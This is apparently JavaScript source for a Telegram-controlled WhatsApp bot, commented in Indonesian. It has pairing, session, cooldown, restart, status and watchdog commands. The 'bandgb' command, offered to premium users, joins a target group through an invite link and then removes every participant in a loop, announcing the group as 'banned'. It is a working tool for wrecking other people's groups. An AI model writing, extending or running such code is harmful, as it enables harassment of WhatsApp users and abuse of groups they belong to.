// ADD SENDER (PAIRING) — ✅ VERSI ASLI, TIDAK DIUBAH
// ============================================================
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "RAFAELAA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/bronsew" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});

// ============================================================
// DEL SESI
// ============================================================
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

bot.command("delsesi", (ctx) => {
  const success = deleteSession();
  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});

// ============================================================
// SETCD
// ============================================================
bot.command("setcd", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds;
    saveCooldown(seconds);
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

// ============================================================
// RESTART
// ============================================================
bot.command("restart", checkOwner, async (ctx) => {
  const startTime = Date.now();

  await ctx.reply(
    "⏳ 🔄 *Merestart panel...*\n\n" +
    "_Bot akan online kembali dalam 3-5 detik._",
    { parse_mode: "Markdown" }
  );

  console.log(chalk.yellow.bold("\n[SUPERVISOR-RESTART] Owner trigger restart..."));

  if (LOG_GROUP_ID) {
    try {
      await ctx.telegram.sendMessage(
        LOG_GROUP_ID,
        `🔄 *PANEL RESTART TRIGGERED*\n\n` +
        `👤 Owner : ${ctx.from.username ? '@' + ctx.from.username : ctx.from.id}\n` +
        `📅 Time  : ${formatDateTime(new Date())}\n` +
        `🖥️ Mode  : Supervisor`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {
      console.error('[RESTART] Gagal kirim log:', e.message);
    }
  }

  try {
    isWhatsAppConnected = false;
    isReconnecting = false;

    if (sock) {
      try { sock.ev.removeAllListeners(); } catch {}
      try { sock.ws?.close(); } catch {}
      try { sock.end?.(undefined); } catch {}
      sock = null;
    }
    console.log(chalk.green("[RESTART] Socket WA di-cleanup."));
  } catch (e) {
    console.error('[RESTART] Cleanup socket error:', e.message);
  }

  setTimeout(() => {
    const durasi = ((Date.now() - startTime) / 1000).toFixed(1);
    console.log(chalk.red.bold(
      `\n[SUPERVISOR-RESTART] Exit dengan code 42 (uptime ${durasi}s).\n`
    ));
    process.exit(42);
  }, 1500);
});

// ============================================================
// STATUS
// ============================================================
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, { parse_mode: "HTML" });
  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

// ============================================================
// BANDGB
// ============================================================
async function OverBannido(sock, groupJid) {
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const participants = metadata.participants.map(p => p.id);
    
    for (const member of participants) {
      try {
        await sock.groupParticipantsUpdate(groupJid, [member], "remove");
        await sleep(500);
      } catch (e) {}
    }
  } catch (e) {
    console.error('[BANDGB] Error:', e.message);
  }
}

bot.command("bandgb", checkPremium, checkCommandEnabled, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply(`Example: /bandgb https://chat.whatsapp.com/CodeGroup`);

  const gcRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]{22,24})/;
  const match = args.match(gcRegex);

  if (!match) return ctx.reply(`❌ Link group tidak valid!`);
  const inviteCode = match[1];

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode); 
    
    if (!groupJid) {
      return ctx.reply(`❌ Gagal masuk ke grup.`);
    }

    await ctx.reply(`
✘ 𝚂𝙰𝙻𝚅𝙰𝙳𝙾𝚁 𝙶𝚁𝙾𝚄𝙿 BANNED ✘
♛ Success Banned Group
♛ Metode    : Add Num`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK GROUP ☚", url: args }],
          ]
        }
      }
    );

    (async () => {
      await OverBannido(sock, groupJid);
    })();

  } catch (error) {
    console.error(error);
    return ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
  }
});

// ============================================================
// WATCHDOG
// ============================================================
setInterval(() => {
  if (!isWhatsAppConnected || !sock) return;
  const idle = Date.now() - lastActivity;

  if (idle > 5 * 60 * 1000 && sendQueue.length === 0) {
    console.log(chalk.yellow('[WATCHDOG] Idle >5 menit, ping socket...'));
    try {
      sock.sendPresenceUpdate('available').catch(() => {});
      lastActivity = Date.now();
    } catch (e) {
      console.log(chalk.red('[WATCHDOG] Socket tidak responsif! Restart...'));
      isWhatsAppConnected = false;
      isReconnecting = false;
      try { sock?.ws?.close?.(); } catch {}
      sock = null;
      setTimeout(() => startSesi().catch(() => {}), 3000);
    }
  }
}, 60000);

// ============================================================
// ENTRY POINT
// ============================================================
if (!IS_CHILD) {
  console.log(chalk.magenta.bold(`
╔═══════════════════════════════╗
║   RAFAEL BOT — SUPERVISOR     ║
║   Auto-restart: AKTIF ✅      ║
╚═══════════════════════════════╝
`));
  runSupervisor();
} else {
  (async () => {
    printBanner();

    try {
      enableBypassProtection();
      await validateToken();
      await checkExpired();
      
      console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

      await startSesi();

      let waitWA = 0;
      while (!isWhatsAppConnected && waitWA < 30) {
        await sleep(1000);
        waitWA++;
      }

      console.log(isWhatsAppConnected 
        ? chalk.green('✅ WA Connected') 
        : chalk.yellow('⚠️ WA belum connect, lanjut bot Telegram saja')
      );

      await bot.launch({
        dropPendingUpdates: true,
        allowedUpdates: ['message', 'callback_query', 'my_chat_member', 'chat_member'],
      });

      console.log(chalk.green.bold('[BOT] Telegram bot aktif!'));

      startUpdateChecker();

    } catch (err) {
      console.error(chalk.red(`[BOOT] Gagal start: ${err.message}`));
      console.error(err.stack);
      process.exit(1);
    }
  })();
}

// ============================================================
// GRACEFUL SHUTDOWN
// ============================================================
process.once('SIGINT', () => {
  try { bot.stop('SIGINT'); } catch {}
  try { sock?.end?.(); } catch {}
});
process.once('SIGTERM', () => {
  try { bot.stop('SIGTERM'); } catch {}
  try { sock?.end?.(); } catch {}
});